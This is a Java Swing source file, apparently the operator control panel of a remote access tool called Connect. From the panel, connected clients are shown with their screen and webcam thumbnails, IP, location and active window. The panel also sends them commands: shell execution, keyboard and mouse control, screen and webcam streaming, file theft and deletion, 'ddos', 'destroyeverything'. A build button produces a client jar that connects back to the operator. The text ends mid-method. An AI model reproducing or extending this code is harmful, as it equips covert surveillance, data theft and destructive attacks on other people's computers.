package br.com.introcdc.connect.server.gui;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 15:46
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.components.FileComponents;
import br.com.introcdc.connect.server.ConnectServer;
import br.com.introcdc.connect.server.components.ServerAudioComponents;
import br.com.introcdc.connect.server.components.ServerControlComponents;
import br.com.introcdc.connect.server.components.ServerImageComponents;

import javax.swing.*;
import javax.swing.border.*;
import javax.swing.event.DocumentEvent;
import javax.swing.event.DocumentListener;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.Transferable;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.awt.event.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.text.DecimalFormat;
import java.util.HashMap;
import java.util.Map;
import java.util.function.Function;

/**
 * Painel principal — versão com tema “hacker”:
 * - Gradientes e bordas neon
 * - Header com status
 * - Barra de status com métricas de rede atualizadas
 * - Mantidos tamanhos originais (logsArea ~ 20x70), comandos e usuários proporcionais
 */
public class ServerGUI extends JFrame {

    private static final long serialVersionUID = 1L;

    // ===== Preferências/tema =====
    public static boolean AUTOCOMPLETE = true;
    public static boolean DARK_MODE = true;

    // Paleta “hacker”
    private static final Color BG_DARK_1 = new Color(14, 18, 16);
    private static final Color BG_DARK_2 = new Color(10, 13, 12);
    private static final Color CARD_BG_1 = new Color(26, 30, 28, 235);
    private static final Color CARD_BG_2 = new Color(20, 24, 22, 235);
    private static final Color NEON = new Color(0x39FF14);
    private static final Color NEON_DIM = new Color(0x1ED760);
    private static final Color TEXT_MAIN = new Color(230, 255, 235);
    private static final Color TEXT_MUTED = new Color(160, 190, 170);
    private static final Color GRID = new Color(50, 60, 55);

    // ===== Atalhos de componentes globais =====
    public static JButton CONTROL = null;
    public static JButton MOUSE = null;
    public static JButton MOUSE_MOVE = null;
    public static JButton MOUSE_MOVE_CLICK = null;
    public static JButton KEYBOARD = null;
    public static JButton AUDIO_USER = null;
    public static JButton AUDIO_SERVER = null;
    public static JFrame CONTROL_FRAME = null;
    public static JFrame AUDIO_CONTROL = null;

    // ===== Autocomplete =====
    private static final String[] ALL_COMMANDS = {
            "sel", "list", "help", "desel", "control", "mouse", "mousemove", "mousemoveclick", "keyboard", "duplicate", "fps", "ddos", "wallpaper",
            "functions", "functionspanel", "info", "restart", "debug", "gc", "ping", "ls", "del", "copy", "move", "mkdir", "cd", "open", "view", "receive",
            "send", "destroyeverything", "download", "zip", "unzip", "audio", "type", "lclick", "mclick", "rclick", "scroll", "history", "screen",
            "webcam", "livestopper", "cmd", "exec", "log", "kill", "listprocess", "clipboard", "msg", "ask", "chat", "voice", "update", "close", "uninstall"
    };

    // ===== Esquerda (logs + comandos) =====
    private final JTextArea logsArea;
    private final JTextField commandField;
    public static JComboBox<String> clientCombo;

    // ===== Botões principais =====
    private final JButton sendButton;
    private final JButton listButton;
    private final JButton helpButton;
    public static JButton controlButton;
    public static JButton createBuildButton;
    public static JButton fpsButton;
    private final JButton folderButton;
    private final JButton clearButton;

    // ===== Métricas de rede =====
    private double download = 0;
    private double upload = 0;

    // ===== Tabela de clientes =====
    private static DefaultTableModel clientTableModel;
    private static JTable clientTable;
    private static final Map<String, Integer> clientRowMap = new HashMap<>();

    // ===== Autocomplete popup =====
    private final JPopupMenu popupSuggestions = new JPopupMenu();
    private final DefaultListModel<String> suggestionsModel = new DefaultListModel<>();
    private final JList<String> suggestionsList = new JList<>(suggestionsModel);
    private boolean autoCompleteEnabled = true;

    // ===== Header / Status bar =====
    private JLabel headerTitle;
    private JLabel headerSubtitle;
    private JLabel statusBar;

    // ===== Singleton =====
    private static ServerGUI instance;

    public static ServerGUI getInstance() {
        return instance;
    }

    public ServerGUI() {
        super("Painel do Servidor - 0 Clientes Conectados | Download: 0kbps - Upload: 0kbps");

        // LookAndFeel base (Nimbus) + tema escuro
        applyDarkNimbus();

        // Ícone
        try {
            ImageIcon icon = new ImageIcon(getClass().getResource("/server.png"));
            setIconImage(icon.getImage());
        } catch (Exception ignored) {
        }

        // ======= HEADER (título + subtítulo com glow) =======
        JPanel header = new GradientPanel(BG_DARK_1, BG_DARK_2);
        header.setLayout(new BorderLayout());
        header.setBorder(new MatteBorder(0, 0, 1, 0, new Color(30, 40, 35)));

        JPanel headerInner = new JPanel(new BorderLayout());
        headerInner.setOpaque(false);
        headerInner.setBorder(BorderFactory.createEmptyBorder(16, 20, 14, 20));

        headerTitle = new JLabel("CONNECT // Painel do Servidor");
        headerTitle.setFont(new Font("Consolas", Font.BOLD, 22));
        headerTitle.setForeground(NEON);

        headerSubtitle = new JLabel("Monitoramento • Comandos • Tela • Webcam • Arquivos • Mensagens");
        headerSubtitle.setFont(new Font("Consolas", Font.PLAIN, 13));
        headerSubtitle.setForeground(TEXT_MUTED);

        headerInner.add(headerTitle, BorderLayout.NORTH);
        headerInner.add(headerSubtitle, BorderLayout.SOUTH);
        header.add(headerInner, BorderLayout.CENTER);

        // ======= ÁREA DE LOGS =======
        logsArea = new JTextArea(20, 70);
        logsArea.setEditable(false);
        logsArea.setFont(new Font("Consolas", Font.PLAIN, 13));
        logsArea.setBackground(new Color(20, 24, 22));
        logsArea.setForeground(TEXT_MAIN);
        logsArea.setCaretColor(NEON);
        JScrollPane logsScroll = wrapInCard(logsArea, "Logs do Servidor");

        // ======= PAINEL DE COMANDO =======
        commandField = new JTextField(25);
        styleField(commandField);

        clientCombo = new JComboBox<>();
        clientCombo.addItem("Nenhum");
        clientCombo.addItem("Todos");
        styleCombo(clientCombo);

        sendButton = createButton("Enviar");
        listButton = createButton("Listar");
        helpButton = createButton("Ajuda");
        controlButton = createButton("Controle Remoto");
        createBuildButton = createButton("Criar Build");
        fpsButton = createButton("FPS (" + ServerImageComponents.FPS + ")");
        folderButton = createButton("Arquivos");
        clearButton = createButton("Limpar");

        JPanel commandPanel = new CardPanel("Controle de Comandos");
        commandPanel.setLayout(new GridBagLayout());
        GridBagConstraints gc = new GridBagConstraints();
        gc.insets = new Insets(6, 6, 6, 6);
        gc.gridx = 0;
        gc.gridy = 0;
        gc.anchor = GridBagConstraints.WEST;
        JLabel clientLabel = label("Cliente:");
        commandPanel.add(clientLabel, gc);

        gc.gridx = 1;
        commandPanel.add(clientCombo, gc);

        gc.gridx = 2;
        commandPanel.add(label("Comando:"), gc);

        gc.gridx = 3;
        gc.weightx = 1;
        gc.fill = GridBagConstraints.HORIZONTAL;
        commandPanel.add(commandField, gc);

        JPanel commandButtons = new JPanel(new FlowLayout(FlowLayout.LEFT, 8, 0));
        commandButtons.setOpaque(false);
        commandButtons.add(sendButton);
        commandButtons.add(listButton);
        commandButtons.add(helpButton);
        commandButtons.add(controlButton);
        commandButtons.add(createBuildButton);
        commandButtons.add(fpsButton);
        commandButtons.add(folderButton);
        commandButtons.add(clearButton);

        gc.gridx = 0;
        gc.gridy = 1;
        gc.gridwidth = 4;
        gc.weightx = 0;
        gc.fill = GridBagConstraints.NONE;
        commandPanel.add(commandButtons, gc);

        // ======= TABELA DE CLIENTES =======
        String[] columnNames = {
                "Tela", "Webcam", "Nome", "IP", "Instalação", "Localização",
                "SO", "Mon / Web", "Ping", "Janela Ativa"
        };

        clientTableModel = new DefaultTableModel(columnNames, 0) {
            @Override
            public Class<?> getColumnClass(int columnIndex) {
                return (columnIndex <= 1) ? ImageIcon.class : String.class;
            }

            @Override
            public boolean isCellEditable(int row, int column) {
                return false;
            }
        };
        clientTable = new JTable(clientTableModel);
        clientTable.setRowHeight(60);
        clientTable.getTableHeader().setReorderingAllowed(false);
        clientTable.setBackground(new Color(22, 26, 24));
        clientTable.setForeground(TEXT_MAIN);
        clientTable.setGridColor(GRID);
        clientTable.getTableHeader().setBackground(new Color(24, 28, 26));
        clientTable.getTableHeader().setForeground(NEON);
        clientTable.setSelectionBackground(new Color(30, 40, 35));
        clientTable.setSelectionForeground(TEXT_MAIN);

        // Col widths (mantidos)
        clientTable.getColumnModel().getColumn(0).setPreferredWidth(80);
        clientTable.getColumnModel().getColumn(1).setPreferredWidth(80);
        clientTable.getColumnModel().getColumn(2).setPreferredWidth(100);
        clientTable.getColumnModel().getColumn(3).setPreferredWidth(120);
        clientTable.getColumnModel().getColumn(4).setPreferredWidth(140);
        clientTable.getColumnModel().getColumn(5).setPreferredWidth(170);
        clientTable.getColumnModel().getColumn(6).setPreferredWidth(90);
        clientTable.getColumnModel().getColumn(7).setPreferredWidth(70);
        clientTable.getColumnModel().getColumn(8).setPreferredWidth(60);
        clientTable.getColumnModel().getColumn(9).setPreferredWidth(380);

        clientTable.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent event) {
                int row = clientTable.rowAtPoint(event.getPoint());
                int column = clientTable.columnAtPoint(event.getPoint());
                if (row >= 0 && column >= 0) {
                    Object cellValue = clientTable.getValueAt(row, column);
                    if (cellValue instanceof String) {
                        copyToClipboard((String) cellValue);
                    } else if (cellValue instanceof ImageIcon) {
                        ImageIcon icon = (ImageIcon) cellValue;
                        copyImageToClipboard(icon.getImage());
                    }
                }
            }
        });

        JScrollPane tableScroll = wrapInCard(clientTable, "Informações dos Clientes");

        // ======= ESQUERDA (comandos + logs + tabela) =======
        JPanel leftStack = new JPanel();
        leftStack.setOpaque(false);
        leftStack.setLayout(new BorderLayout(10, 10));
        JPanel topStack = new JPanel(new BorderLayout(10, 10));
        topStack.setOpaque(false);
        topStack.add(commandPanel, BorderLayout.NORTH);
        topStack.add(logsScroll, BorderLayout.CENTER);
        leftStack.add(topStack, BorderLayout.CENTER);
        leftStack.add(tableScroll, BorderLayout.SOUTH);

        // ======= DIREITA (cards com ações) =======
        JPanel rightPanel = new JPanel();
        rightPanel.setOpaque(false);
        rightPanel.setLayout(new BoxLayout(rightPanel, BoxLayout.Y_AXIS));
        rightPanel.add(sectionMisc());
        rightPanel.add(Box.createVerticalStrut(10));
        rightPanel.add(sectionCommands());
        rightPanel.add(Box.createVerticalStrut(10));
        rightPanel.add(sectionMessages());
        rightPanel.add(Box.createVerticalStrut(10));
        rightPanel.add(sectionMouseKeyboard());
        rightPanel.add(Box.createVerticalStrut(10));
        rightPanel.add(sectionScreenWebcam());
        rightPanel.add(Box.createVerticalStrut(10));
        rightPanel.add(sectionFolders());
        rightPanel.add(Box.createVerticalStrut(10));
        rightPanel.add(sectionFiles());

        JScrollPane rightScroll = new JScrollPane(rightPanel);
        rightScroll.setPreferredSize(new Dimension(600, 500));
        rightScroll.setBorder(new EmptyBorder(0, 0, 0, 0));
        rightScroll.getViewport().setOpaque(false);
        rightScroll.setOpaque(false);

        // ======= STATUS BAR =======
        statusBar = new JLabel("▲ 0.00 kbps  |  ▼ 0.00 kbps  |  Clientes: 0");
        statusBar.setForeground(TEXT_MUTED);
        statusBar.setFont(new Font("Consolas", Font.PLAIN, 12));
        statusBar.setBorder(new CompoundBorder(
                new MatteBorder(1, 0, 0, 0, new Color(30, 40, 35)),
                new EmptyBorder(6, 10, 6, 10)
        ));
        JPanel statusWrap = new GradientPanel(BG_DARK_2, BG_DARK_2.darker());
        statusWrap.setLayout(new BorderLayout());
        statusWrap.add(statusBar, BorderLayout.WEST);

        // ======= CONTEÚDO PRINCIPAL =======
        JPanel content = new GradientPanel(BG_DARK_1, BG_DARK_2);
        content.setLayout(new BorderLayout(10, 10));
        content.setBorder(new EmptyBorder(10, 10, 10, 10));
        content.add(header, BorderLayout.NORTH);
        content.add(leftStack, BorderLayout.CENTER);
        content.add(rightScroll, BorderLayout.EAST);
        content.add(statusWrap, BorderLayout.SOUTH);

        setContentPane(content);

        // ======= Autocomplete =======
        setupAutocomplete();

        // ======= Ações principais =======
        sendButton.addActionListener(event -> sendCommand());
        commandField.addActionListener(event -> sendCommand());
        listButton.addActionListener(event -> ConnectServer.handleCommand("list"));
        helpButton.addActionListener(event -> ConnectServer.handleCommand("help"));
        controlButton.addActionListener(event -> remoteControlPanel());
        createBuildButton.addActionListener(event -> {
            String userInput = JOptionPane.showInputDialog(
                    this, "Digite o IP que irá conectar (vazio = " + Connect.IP + ")", "IP", JOptionPane.PLAIN_MESSAGE);
            String selected = userInput != null && !userInput.trim().isEmpty() ? userInput.trim() : Connect.IP;

            String fileName = FileComponents.getFileName();
            if (fileName.isEmpty()) {
                Connect.saveJar(new File("target/Connect.jar"), selected);
            } else {
                Connect.saveJar(new File(fileName), selected);
            }
            JOptionPane.showMessageDialog(this, "Build para o IP " + selected + " criada!\nPortas usadas: 12345 até 12355!", "Sucesso", JOptionPane.INFORMATION_MESSAGE);
            try {
                Desktop.getDesktop().open(new File("connect"));
            } catch (Exception ex) {
                ConnectServer.msg("Erro ao abrir a pasta de recebidos!");
            }
        });
        fpsButton.addActionListener(event -> {
            String userInput = JOptionPane.showInputDialog(this, "Escolha o FPS", "FPS", JOptionPane.PLAIN_MESSAGE);
            if (userInput != null && !userInput.trim().isEmpty()) {
                ConnectServer.handleCommand("fps " + userInput);
            }
        });
        folderButton.addActionListener(event -> {
            try {
                Desktop.getDesktop().open(new File("connect"));
                ConnectServer.msg("Pasta de recebidos aberta!");
            } catch (Exception ex) {
                ConnectServer.msg("Erro ao abrir a pasta de recebidos!");
            }
        });
        clearButton.addActionListener(event -> {
            logsArea.setText("Servidor iniciado na porta " + Connect.PORT + "\n");
            JOptionPane.showMessageDialog(this, "Console limpo!", "Console", JOptionPane.INFORMATION_MESSAGE);
        });

        clientCombo.addItemListener(e -> {
            if (e.getStateChange() == ItemEvent.SELECTED) {
                String it = (String) e.getItem();
                ConnectServer.msg("Cliente selecionado: " +
                        (it.equalsIgnoreCase("Todos") || it.equalsIgnoreCase("Nenhum")
                                ? it
                                : ConnectServer.CLIENTS.get(Integer.parseInt(it)).getClientInfo()));
            }
        });

        // Estado inicial do botão de controle
        toggleColor(controlButton, ServerControlComponents.CONTROL);
        controlButton.setForeground(Color.BLACK);

        // Janela
        setDefaultCloseOperation(EXIT_ON_CLOSE);
        pack();
        setLocationRelativeTo(null);
        setExtendedState(JFrame.MAXIMIZED_BOTH);

        // Dispara monitor de rede (usa teu método)
        new Thread(this::monitorTraffic, "net-monitor").start();
    }

    // ====== Helpers de estilo ======
    private void applyDarkNimbus() {
        try {
            UIManager.setLookAndFeel("javax.swing.plaf.nimbus.NimbusLookAndFeel");
            if (DARK_MODE) {
                UIManager.put("control", BG_DARK_1);
                UIManager.put("text", TEXT_MAIN);
                UIManager.put("nimbusBase", new Color(18, 26, 22));
                UIManager.put("nimbusFocus", NEON_DIM);
                UIManager.put("nimbusLightBackground", BG_DARK_2);
                UIManager.put("info", BG_DARK_2);
                UIManager.put("nimbusSelectionBackground", new Color(30, 40, 35));
                UIManager.put("nimbusSelectedText", TEXT_MAIN);
                UIManager.put("nimbusDisabledText", new Color(110, 120, 115));
                UIManager.put("OptionPane.background", BG_DARK_2);
                UIManager.put("Panel.background", BG_DARK_1);
                UIManager.put("TextField.background", new Color(26, 30, 28));
                UIManager.put("TextField.foreground", TEXT_MAIN);
                UIManager.put("TextArea.background", new Color(22, 26, 24));
                UIManager.put("TextArea.foreground", TEXT_MAIN);
                UIManager.put("ComboBox.background", new Color(26, 30, 28));
                UIManager.put("ComboBox.foreground", TEXT_MAIN);
                UIManager.put("Button.background", new Color(36, 40, 38));
                UIManager.put("Button.foreground", TEXT_MAIN);
            }
        } catch (Exception ignored) {
        }
        SwingUtilities.updateComponentTreeUI(this);
    }

    private static JLabel label(String t) {
        JLabel l = new JLabel(t);
        l.setForeground(TEXT_MAIN);
        l.setFont(new Font("Consolas", Font.PLAIN, 13));
        return l;
    }

    private static void styleField(JTextField f) {
        f.setBackground(new Color(26, 30, 28));
        f.setForeground(TEXT_MAIN);
        f.setCaretColor(NEON);
        f.setFont(new Font("Consolas", Font.PLAIN, 13));
        f.setBorder(new CompoundBorder(
                new LineBorder(new Color(40, 55, 45), 1),
                new EmptyBorder(6, 8, 6, 8)
        ));
    }

    private static void styleCombo(JComboBox<?> c) {
        c.setBackground(new Color(26, 30, 28));
        c.setForeground(TEXT_MAIN);
        c.setFont(new Font("Consolas", Font.PLAIN, 13));
        c.setBorder(new LineBorder(new Color(40, 55, 45), 1));
    }

    private static JScrollPane wrapInCard(JComponent inner, String title) {
        JScrollPane sp = new JScrollPane(inner);
        sp.setOpaque(false);
        sp.getViewport().setOpaque(false);
        CardPanel card = new CardPanel(title);
        card.setLayout(new BorderLayout());
        card.add(sp, BorderLayout.CENTER);
        JScrollPane outer = new JScrollPane(card);
        outer.setBorder(new EmptyBorder(0, 0, 0, 0));
        outer.setOpaque(false);
        outer.getViewport().setOpaque(false);
        // Retorna só o “card” puro pra usar no layout sem dupla barra
        return sp; // vamos aplicar o CardPanel diretamente onde for adicionar
    }

    public static JButton createButton(String text) {
        JButton b = new JButton(text) {
            @Override
            protected void paintComponent(Graphics g) {
                Graphics2D g2 = (Graphics2D) g.create();
                g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
                // Fundo gradiente leve
                GradientPaint gp = new GradientPaint(0, 0, new Color(30, 36, 34), 0, getHeight(), new Color(22, 26, 24));
                g2.setPaint(gp);
                g2.fillRoundRect(0, 0, getWidth(), getHeight(), 14, 14);
                // Borda neon discreta
                g2.setColor(new Color(60, 90, 70));
                g2.drawRoundRect(0, 0, getWidth() - 1, getHeight() - 1, 14, 14);
                super.paintComponent(g2);
                g2.dispose();
            }
        };
        b.setForeground(TEXT_MAIN);
        b.setFont(new Font("Consolas", Font.BOLD, 12));
        b.setContentAreaFilled(false);
        b.setFocusPainted(false);
        b.setBorder(new EmptyBorder(8, 12, 8, 12));
        b.setCursor(Cursor.getPredefinedCursor(Cursor.HAND_CURSOR));
        // Hover
        b.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseEntered(MouseEvent e) {
                b.setForeground(NEON);
            }

            @Override
            public void mouseExited(MouseEvent e) {
                b.setForeground(TEXT_MAIN);
            }
        });
        return b;
    }

    // ====== Seções (cards) ======
    private JPanel sectionMisc() {
        JPanel miscPanel = new GridCard("Diversos", 3, 2);
        miscPanel.add(createSimpleActionButton("Info", "info"));
        miscPanel.add(createSimpleActionButton("Ping", "ping"));
        miscPanel.add(createSimpleActionButton("Atualizar", "update"));
        miscPanel.add(createSimpleActionButton("Desconectar", "close"));
        miscPanel.add(createSimpleActionButton("Reiniciar", "restart"));
        miscPanel.add(createSimpleActionButton("Desinstalar", "uninstall"));
        return miscPanel;
    }

    private JPanel sectionCommands() {
        JPanel commandsPanel = new GridCard("Comandos", 3, 2);
        commandsPanel.add(createInputActionButton("Executar", "cmd", "Digite o comando a executar:"));
        commandsPanel.add(createInputActionButton("Comando em Processo", "exec", "Digite o id do processo e comando a executar:"));
        commandsPanel.add(createSimpleActionButton("Listar", "listprocess"));
        commandsPanel.add(createInputActionButton("Matar", "kill", "Digite o ID do processo:"));
        commandsPanel.add(createInputActionButton("Logs", "log", "Digite o ID do processo:"));
        commandsPanel.add(createSimpleActionButton("Liberar Memória", "gc"));
        return commandsPanel;
    }

    private JPanel sectionMessages() {
        JPanel messagesPanel = new GridCard("Mensagens", 3, 2);
        messagesPanel.add(createInputActionButton("Mensagem", "msg", "Digite a mensagem:", s -> s.endsWith("?") ? "ask" : "msg"));
        messagesPanel.add(createSimpleActionButton("Chat de Texto", "chat <"));
        messagesPanel.add(createSimpleActionButton("Chat de Voz", "audio controls"));
        messagesPanel.add(createInputActionButton("Texto no Clipboard", "clipboard", "Definir clipboard (<<< para receber o clipboard):"));
        messagesPanel.add(createInputActionButton("Reproduzir Voz", "voice", "Digite o texto:"));
        messagesPanel.add(createSimpleActionButton("Funções", "functionspanel"));
        return messagesPanel;
    }

    private JPanel sectionMouseKeyboard() {
        JPanel panel = new GridCard("Mouse e Teclado", 2, 2);
        panel.add(createMouseButton("Clique Esquerdo", "lclick"));
        panel.add(createMouseButton("Clique Direito", "rclick"));
        panel.add(createMouseButton("Clique Meio", "mclick"));
        panel.add(createInputActionButton("Digitar Texto", "type", "Texto para digitar:"));
        return panel;
    }

    private JPanel sectionScreenWebcam() {
        JPanel screenPanel = new GridCard("Tela e Webcam", 3, 2);
        screenPanel.add(createSimpleActionButton("Print da Tela", "screen"));
        screenPanel.add(createSimpleActionButton("Print da Webcam", "webcam"));
        screenPanel.add(createSimpleActionButton("Transmissão de Tela", "screen 1 %fps%"));
        screenPanel.add(createSimpleActionButton("Transmissão da Webcam", "webcam 1 %fps%"));
        screenPanel.add(createSimpleActionButton("Histórico da Tela", "history screen"));
        screenPanel.add(createSimpleActionButton("Histórico da Webcam", "history webcam"));
        return screenPanel;
    }

    private JPanel sectionFolders() {
        JPanel folderPanel = new GridCard("Pastas", 3, 2);
        folderPanel.add(createSimpleActionButton("Listar (ls)", "ls"));
        folderPanel.add(createInputActionButton("Entrar (cd)", "cd", "Nome da pasta:"));
        folderPanel.add(createSimpleActionButton("Voltar (cd ..)", "cd .."));
        folderPanel.add(createInputActionButton("Criar Pasta (mkdir)", "mkdir", "Nome da pasta:"));
        folderPanel.add(createSimpleActionButton("Pasta Principal (user.dir)", "cd user.dir"));
        folderPanel.add(createSimpleActionButton("Pasta Usuário (user.home)", "cd user.home"));
        return folderPanel;
    }

    private JPanel sectionFiles() {
        JPanel filePanel = new GridCard("Arquivos", 5, 2);
        filePanel.add(createInputActionButton("Receber (receive)", "receive", "Arquivo/Pasta a receber:"));
        filePanel.add(createInputActionButton("Enviar (send)", "send", "Arquivo/Pasta a enviar:"));
        filePanel.add(createInputActionButton("Copiar (copy)", "copy", "Nome do arquivo/pasta-/-nome do arquivo/pasta:"));
        filePanel.add(createInputActionButton("Mover (move)", "move", "Nome do arquivo/pasta-/-nome do arquivo/pasta:"));
        filePanel.add(createInputActionButton("Excluir (del)", "del", "Nome do arquivo/pasta:"));
        filePanel.add(createInputActionButton("Baixar (download)", "download", "URL para baixar:"));
        filePanel.add(createInputActionButton("Zipar (zip)", "zip", "Pasta ou arquivo:"));
        filePanel.add(createInputActionButton("Deszipar (unzip)", "unzip", "Arquivo.zip:"));
        filePanel.add(createInputActionButton("Visualizar (view)", "view", "Nome do arquivo:"));
        filePanel.add(createInputActionButton("Detalhes (fileinfo)", "fileinfo", "Nome do arquivo:"));
        return filePanel;
    }

    // ====== Botões/inputs utilitários ======
    public static JButton createSimpleActionButton(String visibleText, String commandToSend) {
        return createSimpleActionButton(visibleText, commandToSend, 12);
    }

    public static JButton createSimpleActionButton(String visibleText, String commandToSend, int font) {
        JButton button = createButton(visibleText);
        button.setFont(new Font("Consolas", Font.BOLD, font));
        if (font <= 12) button.setMargin(new Insets(4, 8, 4, 8));
        button.addActionListener(e -> sendDirectCommand(commandToSend.replace("%fps%", String.valueOf(ServerImageComponents.FPS))));
        return button;
    }

    public static JButton createInputActionButton(String visibleText, String commandPrefix, String promptMessage) {
        return createInputActionButton(visibleText, commandPrefix, promptMessage, null);
    }

    public static JButton createInputActionButton(String visibleText, String commandPrefix, String promptMessage, Function<String, String> function) {
        JButton btn = createButton(visibleText);
        btn.setFont(new Font("Consolas", Font.BOLD, 12));
        btn.setMargin(new Insets(4, 8, 4, 8));
        configInputButton(btn, visibleText, commandPrefix, promptMessage, function);
        return btn;
    }

    public static void configInputButton(JButton button, String visibleText, String commandPrefix, String promptMessage, Function<String, String> function) {
        button.addActionListener(e -> {
            String userInput = JOptionPane.showInputDialog(getInstance(), promptMessage, visibleText, JOptionPane.PLAIN_MESSAGE);
            if (userInput != null && !userInput.trim().isEmpty()) {
                if (function != null) {
                    sendDirectCommand(function.apply(userInput) + " " + userInput);
                } else {
                    sendDirectCommand(commandPrefix + " " + userInput);
                }
            }
            if (commandPrefix.equalsIgnoreCase("voice")) {
                ServerAudioComponents.playText(userInput);
            }
        });
    }

    private JButton createMouseButton(String visibleText, String commandPrefix) {
        JButton btn = createButton(visibleText);
        btn.setFont(new Font("Consolas", Font.BOLD, 12));
        btn.setMargin(new Insets(4, 8, 4, 8));
        btn.addActionListener(e -> {
            String coords = JOptionPane.showInputDialog(this, "Digite as coordenadas (x y):", visibleText, JOptionPane.PLAIN_MESSAGE);
            if (coords != null && !coords.trim().isEmpty()) {
                sendDirectCommand(commandPrefix + " " + coords);
            } else {
                sendDirectCommand(commandPrefix);
            }
        });
        return btn;
    }

    public static void sendDirectCommand(String command) {
        String selection = (String) clientCombo.getSelectedItem();
        if (selection == null || selection.equals("Nenhum")) {
            ConnectServer.SELECTED_CLIENT = 0;
        } else if (selection.equals("Todos")) {
            ConnectServer.SELECTED_CLIENT = -1;
        } else {
            try {
                ConnectServer.SELECTED_CLIENT = Integer.parseInt(selection);
            } catch (NumberFormatException ex) {
                log("ID inválido: " + selection);
                return;
            }
        }
        ConnectServer.handleCommand(command);
    }

    // ====== Singleton Show ======
    public static void showGUI() {
        if (instance == null) {
            instance = new ServerGUI();
        }
        instance.setVisible(true);
    }

    // ====== Log ======
    public static void log(String message) {
        if (instance != null) {
            instance.logsArea.append(message + "\n");
            instance.logsArea.setCaretPosition(instance.logsArea.getDocument().getLength());
        }
        System.out.println(message);
    }

    // ====== Clientes (combo/tabela) ======
    public static void addClient(String clientId) {
        if (instance != null) {
            instance.clientCombo.addItem(clientId);
            int size = ConnectServer.CLIENTS.size();
            String plus = size == 1 ? "" : "s";
            instance.setTitle("Painel do Servidor | " + size + " Cliente" + plus + " Conectado" + plus + " | Download: " + instance.df(instance.download) + "kbps - Upload: " + instance.df(instance.upload) + "kbps");
            instance.updateHeaderSubtitle();
            instance.updateStatusBar();
        }
    }

    public static void removeClient(String clientId) {
        if (instance != null) {
            instance.clientCombo.removeItem(clientId);
            instance.updateHeaderSubtitle();
            instance.updateStatusBar();
        }
    }

    // ====== Envio pelo campo ======
    private void sendCommand() {
        String command = commandField.getText().trim();
        if (command.isEmpty()) return;

        String selection = (String) clientCombo.getSelectedItem();
        if (selection == null || selection.equals("Nenhum")) {
            ConnectServer.SELECTED_CLIENT = 0;
        } else if (selection.equals("Todos")) {
            ConnectServer.SELECTED_CLIENT = -1;
        } else {
            try {
                ConnectServer.SELECTED_CLIENT = Integer.parseInt(selection);
            } catch (NumberFormatException e) {
                log("ID inválido: " + selection);
                return;
            }
        }
        ConnectServer.handleCommand(command);
        commandField.setText("");
    }

    // ====== Autocomplete ======
    private void setupAutocomplete() {
        suggestionsList.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        suggestionsList.setFont(new Font("Consolas", Font.PLAIN, 13));
        suggestionsList.setBackground(new Color(26, 30, 28));
        suggestionsList.setForeground(TEXT_MAIN);
        suggestionsList.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent e) {
                if (e.getClickCount() == 2) applySelectedSuggestion();
            }
        });
        JScrollPane scrollSuggestions = new JScrollPane(suggestionsList);
        scrollSuggestions.setPreferredSize(new Dimension(160, 120));
        scrollSuggestions.setBorder(new LineBorder(new Color(40, 55, 45), 1));
        popupSuggestions.add(scrollSuggestions);

        commandField.getDocument().addDocumentListener(new DocumentListener() {
            @Override
            public void insertUpdate(DocumentEvent e) {
                if (AUTOCOMPLETE) updateSuggestions();
            }

            @Override
            public void removeUpdate(DocumentEvent e) {
                if (AUTOCOMPLETE) updateSuggestions();
            }

            @Override
            public void changedUpdate(DocumentEvent e) {
            }
        });

        commandField.addKeyListener(new KeyAdapter() {
            @Override
            public void keyPressed(KeyEvent e) {
                if (popupSuggestions.isVisible()) {
                    int idx = suggestionsList.getSelectedIndex();
                    if (e.getKeyCode() == KeyEvent.VK_DOWN) {
                        if (idx < suggestionsModel.size() - 1) {
                            suggestionsList.setSelectedIndex(idx + 1);
                            suggestionsList.ensureIndexIsVisible(idx + 1);
                        }
                    } else if (e.getKeyCode() == KeyEvent.VK_UP) {
                        if (idx > 0) {
                            suggestionsList.setSelectedIndex(idx - 1);
                            suggestionsList.ensureIndexIsVisible(idx - 1);
                        }
                    } else if (e.getKeyCode() == KeyEvent.VK_ENTER) {
                        applySelectedSuggestion();
                        e.consume();
                    }
                }
            }
        });
    }

    private void updateSuggestions() {
        if (!autoCompleteEnabled) {
            popupSuggestions.setVisible(false);
            return;
        }
        String typed = commandField.getText().trim();
        suggestionsModel.clear();
        if (typed.isEmpty()) {
            popupSuggestions.setVisible(false);
            return;
        }
        for (String cmd : ALL_COMMANDS) {
            if (cmd.toLowerCase().startsWith(typed.toLowerCase())) suggestionsModel.addElement(cmd);
        }
        if (suggestionsModel.isEmpty()) {
            popupSuggestions.setVisible(false);
            return;
        }
        popupSuggestions.show(commandField, 0, commandField.getHeight());
        commandField.requestFocusInWindow();
        suggestionsList.setSelectedIndex(0);
    }

    private void applySelectedSuggestion() {
        String selectedValue = suggestionsList.getSelectedValue();
        if (selectedValue != null) commandField.setText(selectedValue);
        popupSuggestions.setVisible(false);
        commandField.requestFocusInWindow();
    }

    public void setAutoCompleteEnabled(boolean enabled) {
        this.autoCompleteEnabled = enabled;
        if (!enabled) popupSuggestions.setVisible(false);
    }

    // ====== Painéis auxiliares ======
    public JFrame remoteControlPanel() {
        applyDarkNimbus();
        if (CONTROL_FRAME != null) CONTROL_FRAME.dispose();

        CONTROL_FRAME = new JFrame("Controle Remoto");
        CONTROL_FRAME.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        try {
            ImageIcon icon = new ImageIcon(getClass().getResource("/eye.png"));
            CONTROL_FRAME.setIconImage(icon.getImage());
        } catch (Exception ignored) {
        }

        JPanel panel = new CardPanel("Controle Remoto");
        panel.setLayout(new FlowLayout(FlowLayout.CENTER, 14, 14));

        CONTROL = createButton("Controle Remoto");
        toggleColor(CONTROL, ServerControlComponents.CONTROL);
